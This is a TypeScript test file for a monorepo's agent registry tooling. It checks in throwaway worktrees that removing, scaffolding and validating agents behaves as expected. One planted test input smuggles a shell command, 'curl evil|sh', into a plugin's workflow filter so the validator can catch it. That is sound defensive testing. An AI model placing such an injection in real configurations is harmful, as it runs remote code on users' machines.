import { chmodSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { AGENT_DEFINITIONS, AgentId } from '@zapbip/agents/definitions';
import { AGENT_INSTALLS } from '@zapbip/agents/install';
import { CONNECTOR_RUNTIMES, ConnectorClient } from '@zapbip/agents/connector';
import { discoverAgents } from '@zapbip/agents/generate';
import { AGENT_PLUGINS } from '@zapbip/agents/plugins';
import { afterAll, describe, expect, test } from 'vitest';
import {
  FULL_SUITES,
  IS_INSIDE_PROOF,
  WORKTREE_PROOF_TIMEOUT_MS,
  changedPathsOf,
  checkOutHead,
  createThrowawayWorktree,
  failuresOf,
  isOutside,
  run,
} from './throwaway-worktree';

const SUPPORTED_ROOT = 'libs/agents/supported';
const SCAFFOLD_KINDS = [
  { name: 'an install agent', flags: [] as string[] },
  { name: 'a connector agent', flags: ['--connector'] },
  { name: 'a plugin agent', flags: ['--plugin'] },
];

const connectorIds: string[] = Object.values(ConnectorClient);
const pluginIds = Object.keys(AGENT_PLUGINS);
const installOnlyId = Object.values(AgentId).find((id) => !connectorIds.includes(id) && !pluginIds.includes(id)) as string;
const removedIds = [...connectorIds.slice(0, -1), ...pluginIds, installOnlyId];

function ownedPrefixesOf(input: { id: string }): string[] {
  const plugin = Object.entries(AGENT_PLUGINS).find(([pluginId]) => pluginId === input.id)?.[1];
  const pluginPrefixes = plugin ? [`${plugin.packageFolder}/`] : [];
  return [`${SUPPORTED_ROOT}/${input.id}/`, ...pluginPrefixes];
}

const reasonedConnectorId = Object.entries(CONNECTOR_RUNTIMES).find(([, runtime]) => runtime.strictMcpNullReason !== null)?.[0] as string;
const installAgentId = Object.keys(AGENT_INSTALLS)[0] as string;
const pluginAgentId = pluginIds[0] as string;
const LEAK_FILE = 'apps/api/src/app.ts';
const PLANTS = [
  {
    name: 'an id planted in a shared source file',
    file: LEAK_FILE,
    id: installAgentId,
    edit: (text: string) => `${text}\nconst planted = '${installAgentId}-ide';\n`,
  },
  {
    name: 'a connector with a null strict flag and no reason',
    file: `${SUPPORTED_ROOT}/${reasonedConnectorId}/connector.ts`,
    id: reasonedConnectorId,
    edit: (text: string) => text.replace(/strictMcpNullReason: StrictMcpNullReason\.\w+,/, 'strictMcpNullReason: null,'),
  },
  {
    name: 'an install section with a two-line product name',
    file: `${SUPPORTED_ROOT}/${installAgentId}/install.ts`,
    id: installAgentId,
    edit: (text: string) => text.replace(/\{ \.\.\.(\w+), render \}/, "{ ...$1, productName: 'First\\nSecond', render }"),
  },
  {
    name: 'a plugin whose workflow filter is an injection',
    file: `${SUPPORTED_ROOT}/${pluginAgentId}/plugin.ts`,
    id: pluginAgentId,
    edit: (text: string) => text.replace("filter: '", 'filter: \'x" ; curl evil|sh # '),
  },
];

const UNREADABLE_FILE = 'README.md';

function extraHeadingEdit(text: string): string {
  return text.replace(/return (\w+)\[input\.locale\]\(input\);/, 'return `${$1[input.locale](input)}\\n\\n## Extra`;');
}

const worktrees: { remove: () => void }[] = [];

function newWorktree() {
  const worktree = createThrowawayWorktree();
  worktrees.push(worktree);
  return worktree;
}

afterAll(() => worktrees.forEach((worktree) => worktree.remove()));

describe.skipIf(IS_INSIDE_PROOF)('the agent lifecycle in a throwaway worktree', () => {
  test('the removal covers one agent of each kind', () => {
    expect(removedIds.length).toBeGreaterThanOrEqual(2);
    expect(connectorIds.length).toBeGreaterThan(removedIds.filter((id) => connectorIds.includes(id)).length);
    expect(removedIds.every((id) => id in AGENT_DEFINITIONS)).toBe(true);
    expect(discoverAgents({ roots: [SUPPORTED_ROOT] }).map((agent) => agent.id)).toEqual(expect.arrayContaining(removedIds));
  });

  test(
    'removing one agent of each kind leaves the removed folders and the generated set as the only diff, and every suite stays green',
    () => {
      const worktree = newWorktree();
      expect(checkOutHead({ directory: worktree.directory }).status).toBe(0);
      const removedPrefixes = removedIds.flatMap((id) => ownedPrefixesOf({ id }));
      expect(run({ command: ['git', 'rm', '-rq', ...removedPrefixes], directory: worktree.directory }).output).toBe('');
      expect(run({ command: ['pnpm', 'install', '--no-frozen-lockfile', '--offline'], directory: worktree.directory }).status).toBe(0);
      const mentions = run({ command: ['pnpm', 'agents:mentions', removedIds[0] as string], directory: worktree.directory });
      expect(mentions.status, mentions.output).toBe(0);
      expect(mentions.output).not.toContain('node:internal');
      const generation = run({ command: ['pnpm', 'agents:generate'], directory: worktree.directory });
      expect(generation.status, generation.output).toBe(0);
      const outside = changedPathsOf({ directory: worktree.directory }).filter((path) => isOutside({ path, prefixes: removedPrefixes }));
      expect(outside).toEqual([]);
      expect(failuresOf({ suites: FULL_SUITES, directory: worktree.directory })).toEqual([]);
    },
    WORKTREE_PROOF_TIMEOUT_MS,
  );

  test(
    'agents:check refuses each planted violation and names the agent and the file',
    () => {
      const worktree = newWorktree();
      expect(checkOutHead({ directory: worktree.directory }).status).toBe(0);
      expect(run({ command: ['pnpm', 'install', '--frozen-lockfile', '--offline'], directory: worktree.directory }).status).toBe(0);
      expect(run({ command: ['pnpm', 'agents:check'], directory: worktree.directory }).status).toBe(0);
      const outcomes = PLANTS.map((plant) => {
        const path = join(worktree.directory, plant.file);
        writeFileSync(path, plant.edit(readFileSync(path, 'utf8')));
        const outcome = run({ command: ['pnpm', 'agents:check'], directory: worktree.directory });
        run({ command: ['git', 'checkout', '--', plant.file], directory: worktree.directory });
        return {
          name: plant.name,
          status: outcome.status,
          namesAgent: outcome.output.includes(plant.id),
          namesFile: outcome.output.includes(plant.file) || plant.file.startsWith(SUPPORTED_ROOT),
        };
      });
      expect(outcomes.filter((outcome) => outcome.status === 0 || !outcome.namesAgent || !outcome.namesFile)).toEqual([]);
    },
    WORKTREE_PROOF_TIMEOUT_MS,
  );

  test(
    'agents:generate writes nothing and exits non-zero while a registry check fails',
    () => {
      const worktree = newWorktree();
      expect(checkOutHead({ directory: worktree.directory }).status).toBe(0);
      expect(run({ command: ['pnpm', 'install', '--frozen-lockfile', '--offline'], directory: worktree.directory }).status).toBe(0);
      const plantedFile = `${SUPPORTED_ROOT}/${installAgentId}/install.ts`;
      const path = join(worktree.directory, plantedFile);
      writeFileSync(path, extraHeadingEdit(readFileSync(path, 'utf8')));
      const generation = run({ command: ['pnpm', 'agents:generate'], directory: worktree.directory });
      expect(generation.status).not.toBe(0);
      expect(generation.output).toContain(`${installAgentId} in en_US: the section must hold exactly one heading`);
      expect(changedPathsOf({ directory: worktree.directory })).toEqual([plantedFile]);
    },
    WORKTREE_PROOF_TIMEOUT_MS,
  );

  test(
    'agents:check reports an unreadable tracked file as a line and exits 1',
    () => {
      const worktree = newWorktree();
      expect(checkOutHead({ directory: worktree.directory }).status).toBe(0);
      expect(run({ command: ['pnpm', 'install', '--frozen-lockfile', '--offline'], directory: worktree.directory }).status).toBe(0);
      chmodSync(join(worktree.directory, UNREADABLE_FILE), 0);
      const outcome = run({ command: ['pnpm', 'agents:check'], directory: worktree.directory });
      chmodSync(join(worktree.directory, UNREADABLE_FILE), 0o644);
      expect(outcome.status).toBe(1);
      expect(outcome.output).toContain(`${UNREADABLE_FILE}: cannot be read (EACCES)`);
      expect(outcome.output).not.toContain('node:fs');
    },
    WORKTREE_PROOF_TIMEOUT_MS,
  );

  test.each(SCAFFOLD_KINDS)(
    'scaffolding $name changes only its folders and the generated set, and every suite stays green',
    ({ flags }) => {
      const scaffoldId = `scaffold-probe-${Math.random().toString(36).slice(2, 8)}`;
      const worktree = newWorktree();
      expect(checkOutHead({ directory: worktree.directory }).status).toBe(0);
      expect(run({ command: ['pnpm', 'install', '--frozen-lockfile', '--offline'], directory: worktree.directory }).status).toBe(0);
      const scaffold = run({ command: ['pnpm', 'agents:new', scaffoldId, ...flags], directory: worktree.directory });
      expect(scaffold.status, scaffold.output).toBe(0);
      expect(run({ command: ['pnpm', 'install', '--no-frozen-lockfile', '--offline'], directory: worktree.directory }).status).toBe(0);
      const generation = run({ command: ['pnpm', 'agents:generate'], directory: worktree.directory });
      expect(generation.status, generation.output).toBe(0);
      const check = run({ command: ['pnpm', 'agents:check'], directory: worktree.directory });
      expect(check.status, check.output).toBe(0);
      const prefixes = [`${SUPPORTED_ROOT}/${scaffoldId}/`, `apps/${scaffoldId}-plugin/`];
      const outside = changedPathsOf({ directory: worktree.directory }).filter((path) => isOutside({ path, prefixes }));
      expect(outside).toEqual([]);
      expect(failuresOf({ suites: FULL_SUITES, directory: worktree.directory })).toEqual([]);
    },
    WORKTREE_PROOF_TIMEOUT_MS,
  );
});
